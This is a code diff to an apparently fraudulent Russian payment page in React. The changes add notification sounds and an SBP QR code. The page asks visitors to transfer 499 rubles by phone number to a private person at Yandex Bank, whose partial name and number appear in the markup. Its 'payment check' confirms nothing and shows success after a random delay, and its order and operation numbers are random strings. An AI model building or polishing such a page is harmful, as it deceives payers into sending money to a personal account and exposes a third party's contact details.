@@ -1,9 +1,10 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { Button } from '@/components/ui/button';
 import { Card, CardContent, CardHeader } from '@/components/ui/card';
 import { Progress } from '@/components/ui/progress';
 import { Alert, AlertDescription } from '@/components/ui/alert';
 import Icon from '@/components/ui/icon';
+import QRCode from 'qrcode';
 
 type ViewState = 'loading' | 'payment' | 'checking' | 'success' | 'cancelled' | 'timeout' | 'info';
 
@@ -14,12 +15,59 @@ const Index = () => {
   const [orderNumber, setOrderNumber] = useState('');
   const [operationNumber, setOperationNumber] = useState('');
   const [paymentNumber, setPaymentNumber] = useState('');
+  const [qrCodeUrl, setQrCodeUrl] = useState('');
+  const [soundEnabled, setSoundEnabled] = useState(true);
+  const audioContextRef = useRef<AudioContext | null>(null);
 
-  // Generate random numbers
+  // Initialize audio context
   useEffect(() => {
-    setOrderNumber(`ORD-${Math.random().toString(36).substr(2, 9).toUpperCase()}`);
-    setOperationNumber(`OP-${Math.random().toString(36).substr(2, 12).toUpperCase()}`);
-    setPaymentNumber(`PAY-${Math.random().toString(36).substr(2, 10).toUpperCase()}`);
+    const initAudio = async () => {
+      try {
+        audioContextRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();
+      } catch (error) {
+        console.log('Audio not supported');
+        setSoundEnabled(false);
+      }
+    };
+    initAudio();
+  }, []);
+
+  // Sound notification function
+  const playSound = (frequency: number, duration: number, type: 'success' | 'error' | 'notification' | 'warning' = 'notification') => {
+    if (!soundEnabled || !audioContextRef.current) return;
+    
+    const ctx = audioContextRef.current;
+    const oscillator = ctx.createOscillator();
+    const gainNode = ctx.createGain();
+    
+    oscillator.connect(gainNode);
+    gainNode.connect(ctx.destination);
+    
+    oscillator.frequency.setValueAtTime(frequency, ctx.currentTime);
+    oscillator.type = type === 'success' ? 'sine' : type === 'error' ? 'sawtooth' : type === 'warning' ? 'triangle' : 'square';
+    
+    gainNode.gain.setValueAtTime(0.1, ctx.currentTime);
+    gainNode.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + duration);
+    
+    oscillator.start(ctx.currentTime);
+    oscillator.stop(ctx.currentTime + duration);
+  };
+
+  // Generate random numbers and QR code
+  useEffect(() => {
+    const orderNum = `ORD-${Math.random().toString(36).substr(2, 9).toUpperCase()}`;
+    const opNum = `OP-${Math.random().toString(36).substr(2, 12).toUpperCase()}`;
+    const payNum = `PAY-${Math.random().toString(36).substr(2, 10).toUpperCase()}`;
+    
+    setOrderNumber(orderNum);
+    setOperationNumber(opNum);
+    setPaymentNumber(payNum);
+    
+    // Generate QR code
+    const qrData = `https://qr.nspk.ru/AS10005Z6E9HKDBR3TLKVGQT60?type=02&bank=100000000007&sum=49900&cur=RUB&crc=E5B4`;
+    QRCode.toDataURL(qrData, { width: 200, margin: 2 })
+      .then(url => setQrCodeUrl(url))
+      .catch(err => console.error('QR generation failed:', err));
   }, []);
 
   // Loading animation
@@ -29,6 +77,7 @@ const Index = () => {
         setLoadingProgress(prev => {
           if (prev >= 100) {
             clearInterval(interval);
+            playSound(800, 0.3, 'notification');
             setViewState('payment');
             return 100;
           }
@@ -47,8 +96,12 @@ const Index = () => {
       interval = setInterval(() => {
         setTimeLeft(prev => {
           if (prev <= 1) {
+            playSound(400, 0.5, 'warning');
             setViewState('timeout');
             return 0;
+          }
+          if (prev === 60) {
+            playSound(600, 0.2, 'warning');
           }
           return prev - 1;
         });
@@ -87,13 +140,16 @@ const Index = () => {
   };
 
   const handlePaymentCheck = () => {
+    playSound(500, 0.2, 'notification');
     setViewState('checking');
     setTimeout(() => {
+      playSound(1000, 0.6, 'success');
       setViewState('success');
     }, Math.random() * 3000 + 7000); // 7-10 seconds
   };
 
   const handleCancel = () => {
+    playSound(300, 0.4, 'error');
     setViewState('cancelled');
     setTimeout(() => {
       setViewState('info');
@@ -196,13 +252,41 @@ const Index = () => {
                 </div>
               </div>
               
-              <div className="space-y-3 mb-6">
+              <div className="space-y-4 mb-6">
                 <h3 className="font-semibold">Реквизиты для перевода:</h3>
-                <div className="bg-green-50 p-4 rounded-lg border-2 border-green-200">
-                  <p className="font-semibold text-green-800">Переведите по номеру телефона:</p>
-                  <p className="text-xl font-bold text-green-900">+7 981 848-79-57</p>
-                  <p className="text-green-700">Яндекс Банк (Людмила Ивановна С.)</p>
-                  <p className="text-green-700 font-semibold">Сумма: 499 рублей</p>
+                
+                <div className="grid md:grid-cols-2 gap-4">
+                  <div className="bg-green-50 p-4 rounded-lg border-2 border-green-200">
+                    <p className="font-semibold text-green-800">Переведите по номеру телефона:</p>
+                    <p className="text-xl font-bold text-green-900">+7 981 848-79-57</p>
+                    <p className="text-green-700">Яндекс Банк (Людмила Ивановна С.)</p>
+                    <p className="text-green-700 font-semibold">Сумма: 499 рублей</p>
+                  </div>
+                  
+                  {qrCodeUrl && (
+                    <div className="bg-blue-50 p-4 rounded-lg border-2 border-blue-200 text-center">
+                      <p className="font-semibold text-blue-800 mb-3">Или отсканируйте QR-код:</p>
+                      <img 
+                        src={qrCodeUrl} 
+                        alt="QR-код для оплаты через СБП" 
+                        className="mx-auto mb-2 rounded"
+                      />
+                      <p className="text-sm text-blue-700">Быстрая оплата через приложение банка</p>
+                    </div>
+                  )}
+                </div>
+                
+                <div className="flex items-center justify-center space-x-4 p-3 bg-gray-50 rounded-lg">
+                  <Icon name="Volume2" className={soundEnabled ? "text-green-600" : "text-gray-400"} size={20} />
+                  <span className="text-sm">Звуковые уведомления:</span>
+                  <Button
+                    variant="outline"
+                    size="sm"
+                    onClick={() => setSoundEnabled(!soundEnabled)}
+                    className={soundEnabled ? "bg-green-100 border-green-300" : ""}
+                  >
+                    {soundEnabled ? "Включены" : "Выключены"}
+                  </Button>
                 </div>
               </div>
 
